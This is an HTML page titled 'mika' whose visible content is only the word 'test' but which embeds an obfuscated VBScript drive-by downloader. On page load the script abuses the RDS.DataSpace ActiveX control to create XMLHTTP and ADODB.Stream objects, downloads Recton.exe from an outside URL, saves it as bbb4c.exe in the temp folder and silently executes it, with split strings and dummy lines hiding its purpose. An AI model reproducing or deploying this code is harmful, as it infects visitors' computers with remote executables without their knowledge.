    <html>
    <title>mika</title>
    <script language="VBScript">
    on error resume next
    R0ot = "http://www.xfocus.net/tools/200411/Recton.exe"
    Set A13I4C = document.createElement("object")
    A13I4C.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
    Le3UrRla="down"
    Le3UrRlb="file"
    Le3UrRlc="copy"
    Le3UrRld="exit"
    Le3UrRle="base"
    Alt3C="Microsoft.XMLHTTP"
    Set AlT4cD = A13I4C.CreateObject(Alt3C,"")
    Le3UrRlf="Ado"
    Le3UrRlg="db."
    Le3UrRlh="Str"
    Le3UrRli="eam"
    JiJiClF=Le3UrRlf&Le3UrRlg&Le3UrRlh&Le3UrRli
    JiJiClG=JiJiClF
    set JiJiClAAA = A13I4C.createobject(JiJiClG,"")
    JiJiClAAA.type = 1
    LambDaD="GET"
    AlT4cD.Open LambDaD, R0ot, False
    AlT4cD.Send
    DoNFiLeAA="bbb4c.exe"
    set YY23CCa = A13I4C.createobject("Scripting.FileSystemObject","")
    set LL4l56A = YY23CCa.GetSpecialFolder(2)
    JiJiClAAA.open
    CAO8="JiJiClAAA.BuildPath(JiJiClAAA,CAO8)"
    CAO7="YY23CCa.BuildPath(YY23CCa,CAO7)"
    CAO6="A13I4C.BuildPath(AlT4cD,CAO6)"
    CAO5="AlT4cD.BuildPath(JiJiClF,CAO5)"
    CAO4="LL4l56A.BuildPath(JiJiClG,CAO4)"
    CAO3="JiJiClF.BuildPath(LambDaD,CAO4)"
    CAO2="JiJiClG.BuildPath(Alt3C,CAO3)"
    CAO1="LambDaD.BuildPath(JiJiClG,CAO1)"
    CAO0="Alt3C.BuildPath(CAOk,CAO0)"
    DoNFiLeAA= YY23CCa.BuildPath(LL4l56A,DoNFiLeAA)
    JiJiClAAA.write AlT4cD.responseBody
    JiJiClAAA.savetofile DoNFiLeAA,2
    JiJiClAAA.close
    set LL4l56A = A13I4C.createobject("Shell.Application","")
    LL4l56A.ShellExecute DoNFiLeAA,BBS,BBS,"open",0
    </script>
    <center>test</center>
    </html>

